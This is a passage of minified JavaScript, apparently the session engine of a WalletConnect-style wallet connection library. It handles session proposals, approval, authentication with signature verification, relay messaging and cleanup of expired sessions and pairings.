this.isValidApprove(t)}catch(N){throw this.client.logger.error("approve() -> isValidApprove() failed"),o.setError(Kp.session_approve_namespace_validation_failure),N}const{id:a,relayProtocol:c,namespaces:l,sessionProperties:u,scopedProperties:d,sessionConfig:h}=t,f=this.client.proposal.get(a);this.client.core.eventClient.deleteEvent({eventId:o.eventId});const{pairingTopic:p,proposer:g,requiredNamespaces:w,optionalNamespaces:m}=f;let x=(n=this.client.core.eventClient)==null?void 0:n.getEvent({topic:p});x||(x=(s=this.client.core.eventClient)==null?void 0:s.createEvent({type:Wl.session_approve_started,properties:{topic:p,trace:[Wl.session_approve_started,Wl.session_namespaces_validation_success]}}));const S=await this.client.core.crypto.generateKeyPair(),T=g.publicKey,k=await this.client.core.crypto.generateSharedKey(S,T),I=un(un(un({relay:{protocol:c??"irn"},namespaces:l,controller:{publicKey:S,metadata:this.client.metadata},expiry:ws(G2)},u&&{sessionProperties:u}),d&&{scopedProperties:d}),h&&{sessionConfig:h}),E=fn.relay;x.addTrace(Wl.subscribing_session_topic);try{await this.client.core.relayer.subscribe(k,{transportType:E})}catch(N){throw x.setError(Kp.subscribe_session_topic_failure),N}x.addTrace(Wl.subscribe_session_topic_success);const C=ca(un({},I),{topic:k,requiredNamespaces:w,optionalNamespaces:m,pairingTopic:p,acknowledged:!1,self:I.controller,peer:{publicKey:g.publicKey,metadata:g.metadata},controller:S,transportType:fn.relay});await this.client.session.set(k,C),x.addTrace(Wl.store_session);try{x.addTrace(Wl.publishing_session_settle),await this.sendRequest({topic:k,method:"wc_sessionSettle",params:I,throwOnFailedPublish:!0}).catch(N=>{throw x?.setError(Kp.session_settle_publish_failure),N}),x.addTrace(Wl.session_settle_publish_success),x.addTrace(Wl.publishing_session_approve),await this.sendResult({id:a,topic:p,result:{relay:{protocol:c??"irn"},responderPublicKey:S},throwOnFailedPublish:!0}).catch(N=>{throw x?.setError(Kp.session_approve_publish_failure),N}),x.addTrace(Wl.session_approve_publish_success)}catch(N){throw this.client.logger.error(N),this.client.session.delete(k,gn("USER_DISCONNECTED")),await this.client.core.relayer.unsubscribe(k),N}return this.client.core.eventClient.deleteEvent({eventId:x.eventId}),await this.client.core.pairing.updateMetadata({topic:p,metadata:g.metadata}),await this.deleteProposal(a),await this.client.core.pairing.activate({topic:p}),await this.setExpiry(k,ws(G2)),{topic:k,acknowledged:()=>Promise.resolve(this.client.session.get(k))}}),Fe(this,"reject",async t=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidReject(t)}catch(o){throw this.client.logger.error("reject() -> isValidReject() failed"),o}const{id:i,reason:n}=t;let s;try{s=this.client.proposal.get(i).pairingTopic}catch(o){throw this.client.logger.error(`reject() -> proposal.get(${i}) failed`),o}s&&await this.sendError({id:i,topic:s,error:n,rpcOpts:$s.wc_sessionPropose.reject}),await this.deleteProposal(i)}),Fe(this,"update",async t=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidUpdate(t)}catch(d){throw this.client.logger.error("update() -> isValidUpdate() failed"),d}const{topic:i,namespaces:n}=t,{done:s,resolve:o,reject:a}=t1(),c=mn(),l=Cs().toString(),u=this.client.session.get(i).namespaces;return this.events.once(Ni("session_update",c),({error:d})=>{d?a(d):o()}),await this.client.session.update(i,{namespaces:n}),await this.sendRequest({topic:i,method:"wc_sessionUpdate",params:{namespaces:n},throwOnFailedPublish:!0,clientRpcId:c,relayRpcId:l}).catch(d=>{this.client.logger.error(d),this.client.session.update(i,{namespaces:u}),a(d)}),{acknowledged:s}}),Fe(this,"extend",async t=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidExtend(t)}catch(c){throw this.client.logger.error("extend() -> isValidExtend() failed"),c}const{topic:i}=t,n=mn(),{done:s,resolve:o,reject:a}=t1();return this.events.once(Ni("session_extend",n),({error:c})=>{c?a(c):o()}),await this.setExpiry(i,ws(G2)),this.sendRequest({topic:i,method:"wc_sessionExtend",params:{},clientRpcId:n,throwOnFailedPublish:!0}).catch(c=>{a(c)}),{acknowledged:s}}),Fe(this,"request",async t=>{this.isInitialized();try{await this.isValidRequest(t)}catch(w){throw this.client.logger.error("request() -> isValidRequest() failed"),w}const{chainId:i,request:n,topic:s,expiry:o=$s.wc_sessionRequest.req.ttl}=t,a=this.client.session.get(s);a?.transportType===fn.relay&&await this.confirmOnlineStateOrThrow();const c=mn(),l=Cs().toString(),{done:u,resolve:d,reject:h}=t1(o,"Request expired. Please try again.");this.events.once(Ni("session_request",c),({error:w,result:m})=>{w?h(w):d(m)});const f="wc_sessionRequest",p=this.getAppLinkIfEnabled(a.peer.metadata,a.transportType);if(p)return await this.sendRequest({clientRpcId:c,relayRpcId:l,topic:s,method:f,params:{request:ca(un({},n),{expiryTimestamp:ws(o)}),chainId:i},expiry:o,throwOnFailedPublish:!0,appLink:p}).catch(w=>h(w)),this.client.events.emit("session_request_sent",{topic:s,request:n,chainId:i,id:c}),await u();const g={request:ca(un({},n),{expiryTimestamp:ws(o)}),chainId:i};return await Promise.all([new Promise(async w=>{await this.sendRequest({clientRpcId:c,relayRpcId:l,topic:s,method:f,params:g,expiry:o,throwOnFailedPublish:!0,tvf:this.getTVFParams(c,g)}).catch(m=>h(m)),this.client.events.emit("session_request_sent",{topic:s,request:n,chainId:i,id:c}),w()}),new Promise(async w=>{var m;if(!((m=a.sessionConfig)!=null&&m.disableDeepLink)){const x=await yUe(this.client.core.storage,rH);await wUe({id:c,topic:s,wcDeepLink:x})}w()}),u()]).then(w=>w[2])}),Fe(this,"respond",async t=>{this.isInitialized(),await this.isValidRespond(t);const{topic:i,response:n}=t,{id:s}=n,o=this.client.session.get(i);o.transportType===fn.relay&&await this.confirmOnlineStateOrThrow();const a=this.getAppLinkIfEnabled(o.peer.metadata,o.transportType);Gi(n)?await this.sendResult({id:s,topic:i,result:n.result,throwOnFailedPublish:!0,appLink:a}):wi(n)&&await this.sendError({id:s,topic:i,error:n.error,appLink:a}),this.cleanupAfterResponse(t)}),Fe(this,"ping",async t=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidPing(t)}catch(n){throw this.client.logger.error("ping() -> isValidPing() failed"),n}const{topic:i}=t;if(this.client.session.keys.includes(i)){const n=mn(),s=Cs().toString(),{done:o,resolve:a,reject:c}=t1();this.events.once(Ni("session_ping",n),({error:l})=>{l?c(l):a()}),await Promise.all([this.sendRequest({topic:i,method:"wc_sessionPing",params:{},throwOnFailedPublish:!0,clientRpcId:n,relayRpcId:s}),o()])}else this.client.core.pairing.pairings.keys.includes(i)&&(this.client.logger.warn("ping() on pairing topic is deprecated and will be removed in the next major release."),await this.client.core.pairing.ping({topic:i}))}),Fe(this,"emit",async t=>{this.isInitialized(),await this.confirmOnlineStateOrThrow(),await this.isValidEmit(t);const{topic:i,event:n,chainId:s}=t,o=Cs().toString(),a=mn();await this.sendRequest({topic:i,method:"wc_sessionEvent",params:{event:n,chainId:s},throwOnFailedPublish:!0,relayRpcId:o,clientRpcId:a})}),Fe(this,"disconnect",async t=>{this.isInitialized(),await this.confirmOnlineStateOrThrow(),await this.isValidDisconnect(t);const{topic:i}=t;if(this.client.session.keys.includes(i))await this.sendRequest({topic:i,method:"wc_sessionDelete",params:gn("USER_DISCONNECTED"),throwOnFailedPublish:!0}),await this.deleteSession({topic:i,emitEvent:!1});else if(this.client.core.pairing.pairings.keys.includes(i))await this.client.core.pairing.disconnect({topic:i});else{const{message:n}=ot("MISMATCHED_TOPIC",`Session or pairing topic not found: ${i}`);throw new Error(n)}}),Fe(this,"find",t=>(this.isInitialized(),this.client.session.getAll().filter(i=>kqe(i,t)))),Fe(this,"getPendingSessionRequests",()=>this.client.pendingRequest.getAll()),Fe(this,"authenticate",async(t,i)=>{var n;this.isInitialized(),this.isValidAuthenticate(t);const s=i&&this.client.core.linkModeSupportedApps.includes(i)&&((n=this.client.metadata.redirect)==null?void 0:n.linkMode),o=s?fn.link_mode:fn.relay;o===fn.relay&&await this.confirmOnlineStateOrThrow();const{chains:a,statement:c="",uri:l,domain:u,nonce:d,type:h,exp:f,nbf:p,methods:g=[],expiry:w}=t,m=[...t.resources||[]],{topic:x,uri:S}=await this.client.core.pairing.create({methods:["wc_sessionAuthenticate"],transportType:o});this.client.logger.info({message:"Generated new pairing",pairing:{topic:x,uri:S}});const T=await this.client.core.crypto.generateKeyPair(),k=y9(T);if(await Promise.all([this.client.auth.authKeys.set(C9,{responseTopic:k,publicKey:T}),this.client.auth.pairingTopics.set(k,{topic:k,pairingTopic:x})]),await this.client.core.relayer.subscribe(k,{transportType:o}),this.client.logger.info(`sending request to new pairing topic: ${x}`),g.length>0){const{namespace:R}=uw(a[0]);let P=Mje(R,"request",g);v9(m)&&(P=Lje(P,m.pop())),m.push(P)}const I=w&&w>$s.wc_sessionAuthenticate.req.ttl?w:$s.wc_sessionAuthenticate.req.ttl,E={authPayload:{type:h??"caip122",chains:a,statement:c,aud:l,domain:u,version:"1",nonce:d,iat:new Date().toISOString(),exp:f,nbf:p,resources:m},requester:{publicKey:T,metadata:this.client.metadata},expiryTimestamp:ws(I)},C={eip155:{chains:a,methods:[...new Set(["personal_sign",...g])],events:["chainChanged","accountsChanged"]}},N={requiredNamespaces:{},optionalNamespaces:C,relays:[{protocol:"irn"}],pairingTopic:x,proposer:{publicKey:T,metadata:this.client.metadata},expiryTimestamp:ws($s.wc_sessionPropose.req.ttl),id:mn()},{done:L,resolve:$,reject:y}=t1(I,"Request expired"),A=mn(),b=Ni("session_connect",N.id),v=Ni("session_request",A),_=async({error:R,session:P})=>{this.events.off(v,O),R?y(R):P&&$({session:P})},O=async R=>{var P,B,M;if(await this.deletePendingAuthRequest(A,{message:"fulfilled",code:0}),R.error){const U=gn("WC_METHOD_UNSUPPORTED","wc_sessionAuthenticate");return R.error.code===U.code?void 0:(this.events.off(b,_),y(R.error.message))}await this.deleteProposal(N.id),this.events.off(b,_);const{cacaos:W,responder:K}=R.result,q=[],J=[];for(const U of W){await Qz({cacao:U,projectId:this.client.core.projectId})||(this.client.logger.error(U,"Signature verification failed"),y(gn("SESSION_SETTLEMENT_FAILED","Signature verification failed")));const{p:G}=U,Z=v9(G.resources),j=[SN(G.iss)],Y=Y7(G.iss);if(Z){const se=Xz(Z),ne=eW(Z);q.push(...se),j.push(...ne)}for(const se of j)J.push(`${se}:${Y}`)}const le=await this.client.core.crypto.generateSharedKey(T,K.publicKey);let ae;q.length>0&&(ae={topic:le,acknowledged:!0,self:{publicKey:T,metadata:this.client.metadata},peer:K,controller:K.publicKey,expiry:ws(G2),requiredNamespaces:{},optionalNamespaces:{},relay:{protocol:"irn"},pairingTopic:x,namespaces:_W([...new Set(q)],[...new Set(J)]),transportType:o},await this.client.core.relayer.subscribe(le,{transportType:o}),await this.client.session.set(le,ae),x&&await this.client.core.pairing.updateMetadata({topic:x,metadata:K.metadata}),ae=this.client.session.get(le)),(P=this.client.metadata.redirect)!=null&&P.linkMode&&(B=K.metadata.redirect)!=null&&B.linkMode&&(M=K.metadata.redirect)!=null&&M.universal&&i&&(this.client.core.addLinkModeSupportedApp(K.metadata.redirect.universal),this.client.session.update(le,{transportType:fn.link_mode})),$({auths:W,session:ae})};this.events.once(b,_),this.events.once(v,O);let D;try{if(s){const R=jn("wc_sessionAuthenticate",E,A);this.client.core.history.set(x,R);const P=await this.client.core.crypto.encode("",R,{type:V4,encoding:Tf});D=m8(i,x,P)}else await Promise.all([this.sendRequest({topic:x,method:"wc_sessionAuthenticate",params:E,expiry:t.expiry,throwOnFailedPublish:!0,clientRpcId:A}),this.sendRequest({topic:x,method:"wc_sessionPropose",params:N,expiry:$s.wc_sessionPropose.req.ttl,throwOnFailedPublish:!0,clientRpcId:N.id})])}catch(R){throw this.events.off(b,_),this.events.off(v,O),R}return await this.setProposal(N.id,N),await this.setAuthRequest(A,{request:ca(un({},E),{verifyContext:{}}),pairingTopic:x,transportType:o}),{uri:D??S,response:L}}),Fe(this,"approveSessionAuthenticate",async t=>{const{id:i,auths:n}=t,s=this.client.core.eventClient.createEvent({properties:{topic:i.toString(),trace:[Gp.authenticated_session_approve_started]}});try{this.isInitialized()}catch(w){throw s.setError(Bb.no_internet_connection),w}const o=this.getPendingAuthRequest(i);if(!o)throw s.setError(Bb.authenticated_session_pending_request_not_found),new Error(`Could not find pending auth request with id ${i}`);const a=o.transportType||fn.relay;a===fn.relay&&await this.confirmOnlineStateOrThrow();const c=o.requester.publicKey,l=await this.client.core.crypto.generateKeyPair(),u=y9(c),d={type:r0,receiverPublicKey:c,senderPublicKey:l},h=[],f=[];for(const w of n){if(!await Qz({cacao:w,projectId:this.client.core.projectId})){s.setError(Bb.invalid_cacao);const k=gn("SESSION_SETTLEMENT_FAILED","Signature verification failed");throw await this.sendError({id:i,topic:u,error:k,encodeOpts:d}),new Error(k.message)}s.addTrace(Gp.cacaos_verified);const{p:m}=w,x=v9(m.resources),S=[SN(m.iss)],T=Y7(m.iss);if(x){const k=Xz(x),I=eW(x);h.push(...k),S.push(...I)}for(const k of S)f.push(`${k}:${T}`)}const p=await this.client.core.crypto.generateSharedKey(l,c);s.addTrace(Gp.create_authenticated_session_topic);let g;if(h?.length>0){g={topic:p,acknowledged:!0,self:{publicKey:l,metadata:this.client.metadata},peer:{publicKey:c,metadata:o.requester.metadata},controller:c,expiry:ws(G2),authentication:n,requiredNamespaces:{},optionalNamespaces:{},relay:{protocol:"irn"},pairingTopic:o.pairingTopic,namespaces:_W([...new Set(h)],[...new Set(f)]),transportType:a},s.addTrace(Gp.subscribing_authenticated_session_topic);try{await this.client.core.relayer.subscribe(p,{transportType:a})}catch(w){throw s.setError(Bb.subscribe_authenticated_session_topic_failure),w}s.addTrace(Gp.subscribe_authenticated_session_topic_success),await this.client.session.set(p,g),s.addTrace(Gp.store_authenticated_session),await this.client.core.pairing.updateMetadata({topic:o.pairingTopic,metadata:o.requester.metadata})}s.addTrace(Gp.publishing_authenticated_session_approve);try{await this.sendResult({topic:u,id:i,result:{cacaos:n,responder:{publicKey:l,metadata:this.client.metadata}},encodeOpts:d,throwOnFailedPublish:!0,appLink:this.getAppLinkIfEnabled(o.requester.metadata,a)})}catch(w){throw s.setError(Bb.authenticated_session_approve_publish_failure),w}return await this.client.auth.requests.delete(i,{message:"fulfilled",code:0}),await this.client.core.pairing.activate({topic:o.pairingTopic}),this.client.core.eventClient.deleteEvent({eventId:s.eventId}),{session:g}}),Fe(this,"rejectSessionAuthenticate",async t=>{this.isInitialized();const{id:i,reason:n}=t,s=this.getPendingAuthRequest(i);if(!s)throw new Error(`Could not find pending auth request with id ${i}`);s.transportType===fn.relay&&await this.confirmOnlineStateOrThrow();const o=s.requester.publicKey,a=await this.client.core.crypto.generateKeyPair(),c=y9(o),l={type:r0,receiverPublicKey:o,senderPublicKey:a};await this.sendError({id:i,topic:c,error:n,encodeOpts:l,rpcOpts:$s.wc_sessionAuthenticate.reject,appLink:this.getAppLinkIfEnabled(s.requester.metadata,s.transportType)}),await this.client.auth.requests.delete(i,{message:"rejected",code:0}),await this.deleteProposal(i)}),Fe(this,"formatAuthMessage",t=>{this.isInitialized();const{request:i,iss:n}=t;return Cre(i,n)}),Fe(this,"processRelayMessageCache",()=>{setTimeout(async()=>{if(this.relayMessageCache.length!==0)for(;this.relayMessageCache.length>0;)try{const t=this.relayMessageCache.shift();t&&await this.onRelayMessage(t)}catch(t){this.client.logger.error(t)}},50)}),Fe(this,"cleanupDuplicatePairings",async t=>{if(t.pairingTopic)try{const i=this.client.core.pairing.pairings.get(t.pairingTopic),n=this.client.core.pairing.pairings.getAll().filter(s=>{var o,a;return((o=s.peerMetadata)==null?void 0:o.url)&&((a=s.peerMetadata)==null?void 0:a.url)===t.peer.metadata.url&&s.topic&&s.topic!==i.topic});if(n.length===0)return;this.client.logger.info(`Cleaning up ${n.length} duplicate pairing(s)`),await Promise.all(n.map(s=>this.client.core.pairing.disconnect({topic:s.topic}))),this.client.logger.info("Duplicate pairings clean up finished")}catch(i){this.client.logger.error(i)}}),Fe(this,"deleteSession",async t=>{var i;const{topic:n,expirerHasDeleted:s=!1,emitEvent:o=!0,id:a=0}=t,{self:c}=this.client.session.get(n);await this.client.core.relayer.unsubscribe(n),await this.client.session.delete(n,gn("USER_DISCONNECTED")),this.addToRecentlyDeleted(n,"session"),this.client.core.crypto.keychain.has(c.publicKey)&&await this.client.core.crypto.deleteKeyPair(c.publicKey),this.client.core.crypto.keychain.has(n)&&await this.client.core.crypto.deleteSymKey(n),s||this.client.core.expirer.del(n),this.client.core.storage.removeItem(rH).catch(l=>this.client.logger.warn(l)),this.getPendingSessionRequests().forEach(l=>{l.topic===n&&this.deletePendingSessionRequest(l.id,gn("USER_DISCONNECTED"))}),n===((i=this.sessionRequestQueue.queue[0])==null?void 0:i.topic)&&(this.sessionRequestQueue.state=Vu.idle),o&&this.client.events.emit("session_delete",{id:a,topic:n})}),Fe(this,"deleteProposal",async(t,i)=>{if(i)try{const n=this.client.proposal.get(t);this.client.core.eventClient.getEvent({topic:n.pairingTopic})?.setError(Kp.proposal_expired)}catch{}await Promise.all([this.client.proposal.delete(t,gn("USER_DISCONNECTED")),i?Promise.resolve():this.client.core.expirer.del(t)]),this.addToRecentlyDeleted(t,"proposal")}),Fe(this,"deletePendingSessionRequest",async(t,i,n=!1)=>{await Promise.all([this.client.pendingRequest.delete(t,i),n?Promise.resolve():this.client.core.expirer.del(t)]),this.addToRecentlyDeleted(t,"request"),this.sessionRequestQueue.queue=this.sessionRequestQueue.queue.filter(s=>s.id!==t),n&&(this.sessionRequestQueue.state=Vu.idle,this.client.events.emit("session_request_expire",{id:t}))}),Fe(this,"deletePendingAuthRequest",async(t,i,n=!1)=>{await Promise.all([this.client.auth.requests.delete(t,i),n?Promise.resolve():this.client.core.expirer.del(t)])}),Fe(this,"setExpiry",async(t,i)=>{this.client.session.keys.includes(t)&&(this.client.core.expirer.set(t,i),await this.client.session.update(t,{expiry:i}))}),Fe(this,"setProposal",async(t,i)=>{this.client.core.expirer.set(t,ws($s.wc_sessionPropose.req.ttl)),await this.client.proposal.set(t,i)}),Fe(this,"setAuthRequest",async(t,i)=>{const{request:n,pairingTopic:s,transportType:o=fn.relay}=i;this.client.core.expirer.set(t,n.expiryTimestamp),await this.client.auth.requests.set(t,{authPayload:n.authPayload,requester:n.requester,expiryTimestamp:n.expiryTimestamp,id:t,pairingTopic:s,verifyContext:n.verifyContext,transportType:o})}),Fe(this,"setPendingSessionRequest",async t=>{const{id:i,topic:n,params:s,verifyContext:o}=t,a=s.request.expiryTimestamp||ws($s.wc_sessionRequest.req.ttl);this.client.core.expirer.set(i,a),await this.client.pendingRequest.set(i,{id:i,topic:n,params:s,verifyContext:o})}),Fe(this,"sendRequest",async t=>{const{topic:i,method:n,params:s,expiry:o,relayRpcId:a,clientRpcId:c,throwOnFailedPublish:l,appLink:u,tvf:d}=t,h=jn(n,s,c);let f;const p=!!u;try{const m=p?Tf:lu;f=await this.client.core.crypto.encode(i,h,{encoding:m})}catch(m){throw await this.cleanup(),this.client.logger.error(`sendRequest() -> core.crypto.encode() for topic ${i} failed`),m}let g;if(xKe.includes(n)){const m=ad(JSON.stringify(h)),x=ad(f);g=await this.client.core.verify.register({id:x,decryptedId:m})}const w=$s[n].req;if(w.attestation=g,o&&(w.ttl=o),a&&(w.id=a),this.client.core.history.set(i,h),p){const m=m8(u,i,f);await global.Linking.openURL(m,this.client.name)}else{const m=$s[n].req;o&&(m.ttl=o),a&&(m.id=a),m.tvf=ca(un({},d),{correlationId:h.id}),l?(m.internal=ca(un({},m.internal),{throwOnFailedPublish:!0}),await this.client.core.relayer.publish(i,f,m)):this.client.core.relayer.publish(i,f,m).catch(x=>this.client.logger.error(x))}return h.id}),Fe(this,"sendResult",async t=>{const{id:i,topic:n,result:s,throwOnFailedPublish:o,encodeOpts:a,appLink:c}=t,l=bl(i,s);let u;const d=c&&typeof(global==null?void 0:global.Linking)<"u";try{const p=d?Tf:lu;u=await this.client.core.crypto.encode(n,l,ca(un({},a||{}),{encoding:p}))}catch(p){throw await this.cleanup(),this.client.logger.error(`sendResult() -> core.crypto.encode() for topic ${n} failed`),p}let h,f;try{h=await this.client.core.history.get(n,i);const p=h.request;try{f=this.getTVFParams(i,p.params,s)}catch(g){this.client.logger.warn(`sendResult() -> getTVFParams() failed: ${g?.message}`)}}catch(p){throw this.client.logger.error(`sendResult() -> history.get(${n}, ${i}) failed`),p}if(d){const p=m8(c,n,u);await global.Linking.openURL(p,this.client.name)}else{const p=h.request.method,g=$s[p].res;g.tvf=ca(un({},f),{correlationId:i}),o?(g.internal=ca(un({},g.internal),{throwOnFailedPublish:!0}),await this.client.core.relayer.publish(n,u,g)):this.client.core.relayer.publish(n,u,g).catch(w=>this.client.logger.error(w))}await this.client.core.history.resolve(l)}),Fe(this,"sendError",async t=>{const{id:i,topic:n,error:s,encodeOpts:o,rpcOpts:a,appLink:c}=t,l=Ap(i,s);let u;const d=c&&typeof(global==null?void 0:global.Linking)<"u";try{const f=d?Tf:lu;u=await this.client.core.crypto.encode(n,l,ca(un({},o||{}),{encoding:f}))}catch(f){throw await this.cleanup(),this.client.logger.error(`sendError() -> core.crypto.encode() for topic ${n} failed`),f}let h;try{h=await this.client.core.history.get(n,i)}catch(f){throw this.client.logger.error(`sendError() -> history.get(${n}, ${i}) failed`),f}if(d){const f=m8(c,n,u);await global.Linking.openURL(f,this.client.name)}else{const f=h.request.method,p=a||$s[f].res;this.client.core.relayer.publish(n,u,p)}await this.client.core.history.resolve(l)}),Fe(this,"cleanup",async()=>{const t=[],i=[];this.client.session.getAll().forEach(n=>{let s=!1;xf(n.expiry)&&(s=!0),this.client.core.crypto.keychain.has(n.topic)||(s=!0),s&&t.push(n.topic)}),this.client.proposal.getAll().forEach(n=>{xf(n.expiryTimestamp)&&i.push(n.id)}),await Promise.all([...t.map(n=>this.deleteSession({topic:n})),...i.map(n=>this.deleteProposal(n))])}),Fe(this,"onProviderMessageEvent",async t=>{!this.initialized||this.relayMessageCache.length>0?this.relayMessageCache.push(t):await this.onRelayMessage(t)}),Fe(this,"onRelayEventRequest",async t=>{this.requestQueue.queue.push(t),await this.processRequestsQueue()}),Fe(this,"processRequestsQueue",async()=>{if(this.requestQueue.state===Vu.active){this.client.logger.info("Request queue already active, skipping...");return}for(this.client.logger.info(`Request queue starting with ${this.requestQueue.queue.length} requests`);this.requestQueue.queue.length>0;){this.requestQueue.state=Vu.active;const t=this.requestQueue.queue.shift();if(t)try{await this.processRequest(t)}catch(i){this.client.logger.warn(i)}}this.requestQueue.state=Vu.idle}),Fe(this,"processRequest",async t=>{const{topic:i,payload:n,attestation:s,transportType:o,encryptedId:a}=t,c=n.method;if(!this.shouldIgnorePairingRequest({topic:i,requestMethod:c}))switch(c){case"wc_sessionPropose":return await this.onSessionProposeRequest({topic:i,payload:n,attestation:s,encryptedId:a});case"wc_sessionSettle":return await this.onSessionSettleRequest(i,n);case"wc_sessionUpdate":return await this.onSessionUpdateRequest(i,n);case"wc_sessionExtend":return await this.onSessionExtendRequest(i,n);case"wc_sessionPing":return await this.onSessionPingRequest(i,n);case"wc_sessionDelete":return await this.onSessionDeleteRequest(i,n);case"wc_sessionRequest":return await this.onSessionRequest({topic:i,payload:n,attestation:s,encryptedId:a,transportType:o});case"wc_sessionEvent":return await this.onSessionEventRequest(i,n);case"wc_sessionAuthenticate":return await this.onSessionAuthenticateRequest({topic:i,payload:n,attestation:s,encryptedId:a,transportType:o});default:return this.client.logger.info(`Unsupported request method ${c}`)}}),Fe(this,"onRelayEventResponse",async t=>{const{topic:i,payload:n,transportType:s}=t,o=(await this.client.core.history.get(i,n.id)).request.method;switch(o){case"wc_sessionPropose":return this.onSessionProposeResponse(i,n,s);case"wc_sessionSettle":return this.onSessionSettleResponse(i,n);case"wc_sessionUpdate":return this.onSessionUpdateResponse(i,n);case"wc_sessionExtend":return this.onSessionExtendResponse(i,n);case"wc_sessionPing":return this.onSessionPingResponse(i,n);case"wc_sessionRequest":return this.onSessionRequestResponse(i,n);case"wc_sessionAuthenticate":return this.onSessionAuthenticateResponse(i,n);default:return this.client.logger.info(`Unsupported response method ${o}`)}}),Fe(this,"onRelayEventUnknownPayload",t=>{const{topic:i}=t,{message:n}=ot("MISSING_OR_INVALID",`Decoded payload on topic ${i} is not identifiable as a JSON-RPC request or a response.`);throw new Error(n)}),Fe(this,"shouldIgnorePairingRequest",t=>{const{topic:i,requestMethod:n}=t,s=this.expectedPairingMethodMap.get(i);return!s||s.includes(n)?!1:!!(s.includes("wc_sessionAuthenticate")&&this.client.events.listenerCount("session_authenticate")>0)}),Fe(this,"onSessionProposeRequest",async t=>{const{topic:i,payload:n,attestation:s,encryptedId:o}=t,{params:a,id:c}=n;try{const l=this.client.core.eventClient.getEvent({topic:i});this.client.events.listenerCount("session_proposal")===0&&(console.warn("No listener for session_proposal event"),l?.setError(Rh.proposal_listener_not_found)),this.isValidConnect(un({},n.params));const u=a.expiryTimestamp||ws($s.wc_sessionPropose.req.ttl),d=un({id:c,pairingTopic:i,expiryTimestamp:u,attestation:s,encryptedId:o},a);await this.setProposal(c,d);const h=await this.getVerifyContext({attestationId:s,hash:ad(JSON.stringify(n)),encryptedId:o,metadata:d.proposer.metadata});l?.addTrace(td.emit_session_proposal),this.client.events.emit("session_proposal",{id:c,params:d,verifyContext:h})}catch(l){await this.sendError({id:c,topic:i,error:l,rpcOpts:$s.wc_sessionPropose.autoReject}),this.client.logger.error(l)}}),Fe(this,"onSessionProposeResponse",async(t,i,n)=>{const{id:s}=i;if(Gi(i)){const{result:o}=i;this.client.logger.trace({type:"method",method:"onSessionProposeResponse",result:o});const a=this.client.proposal.get(s);this.client.logger.trace({type:"method",method:"onSessionProposeResponse",proposal:a});const c=a.proposer.publicKey;this.client.logger.trace({type:"method",method:"onSessionProposeResponse",selfPublicKey:c});const l=o.responderPublicKey;this.client.logger.trace({type:"method",method:"onSessionProposeResponse",peerPublicKey:l});const u=await this.client.core.crypto.generateSharedKey(c,l);this.pendingSessions.set(s,{sessionTopic:u,pairingTopic:t,proposalId:s,publicKey:c});const d=await this.client.core.relayer.subscribe(u,{transportType:n});this.client.logger.trace({type:"method",method:"onSessionProposeResponse",subscriptionId:d}),await this.client.core.pairing.activate({topic:t})}else if(wi(i)){await this.deleteProposal(s);const o=Ni("session_connect",s);if(this.events.listenerCount(o)===0)throw new Error(`emitting ${o} without any listeners, 954`);this.events.emit(o,{error:i.error})}}),Fe(this,"onSessionSettleRequest",async(t,i)=>{const{id:n,params:s}=i;try{this.isValidSessionSettleRequest(s);const{relay:o,controller:a,expiry:c,namespaces:l,sessionProperties:u,scopedProperties:d,sessionConfig:h}=i.params,f=[...this.pendingSessions.values()].find(w=>w.sessionTopic===t);if(!f)return this.client.logger.error(`Pending session not found for topic ${t}`);const p=this.client.proposal.get(f.proposalId),g=ca(un(un(un({topic:t,relay:o,expiry:c,namespaces:l,acknowledged:!0,pairingTopic:f.pairingTopic,requiredNamespaces:p.requiredNamespaces,optionalNamespaces:p.optionalNamespaces,controller:a.publicKey,self:{publicKey:f.publicKey,metadata:this.client.metadata},peer:{publicKey:a.publicKey,metadata:a.metadata}},u&&{sessionProperties:u}),d&&{scopedProperties:d}),h&&{sessionConfig:h}),{transportType:fn.relay});await this.client.session.set(g.topic,g),await this.setExpiry(g.topic,g.expiry),await this.client.core.pairing.updateMetadata({topic:f.pairingTopic,metadata:g.peer.metadata}),this.client.events.emit("session_connect",{session:g}),this.events.emit(Ni("session_connect",f.proposalId),{session:g}),this.pendingSessions.delete(f.proposalId),this.deleteProposal(f.proposalId,!1),this.cleanupDuplicatePairings(g),await this.sendResult({id:i.id,topic:t,result:!0})}catch(o){await this.sendError({id:n,topic:t,error:o}),this.client.logger.error(o)}}),Fe(this,"onSessionSettleResponse",async(t,i)=>{const{id:n}=i;Gi(i)?(await this.client.session.update(t,{acknowledged:!0}),this.events.emit(Ni("session_approve",n),{})):wi(i)&&(await this.client.session.delete(t,gn("USER_DISCONNECTED")),this.events.emit(Ni("session_approve",n),{error:i.error}))}),Fe(this,"onSessionUpdateRequest",async(t,i)=>{const{params:n,id:s}=i;try{const o=`${t}_session_update`,a=Rb.get(o);if(a&&this.isRequestOutOfSync(a,s)){this.client.logger.warn(`Discarding out of sync request - ${s}`),this.sendError({id:s,topic:t,error:gn("INVALID_UPDATE_REQUEST")});return}this.isValidUpdate(un({topic:t},n));try{Rb.set(o,s),await this.client.session.update(t,{namespaces:n.namespaces}),await this.sendResult({id:s,topic:t,result:!0})}catch(c){throw Rb.delete(o),c}this.client.events.emit("session_update",{id:s,topic:t,params:n})}catch(o){await this.sendError({id:s,topic:t,error:o}),this.client.logger.error(o)}}),Fe(this,"isRequestOutOfSync",(t,i)=>i.toString().slice(0,-3)<t.toString().slice(0,-3)),Fe(this,"onSessionUpdateResponse",(t,i)=>{const{id:n}=i,s=Ni("session_update",n);if(this.events.listenerCount(s)===0)throw new Error(`emitting ${s} without any listeners`);Gi(i)?this.events.emit(Ni("session_update",n),{}):wi(i)&&this.events.emit(Ni("session_update",n),{error:i.error})}),Fe(this,"onSessionExtendRequest",async(t,i)=>{const{id:n}=i;try{this.isValidExtend({topic:t}),await this.setExpiry(t,ws(G2)),await this.sendResult({id:n,topic:t,result:!0}),this.client.events.emit("session_extend",{id:n,topic:t})}catch(s){await this.sendError({id:n,topic:t,error:s}),this.client.logger.error(s)}}),Fe(this,"onSessionExtendResponse",(t,i)=>{const{id:n}=i,s=Ni("session_extend",n);if(this.events.listenerCount(s)===0)throw new Error(`emitting ${s} without any 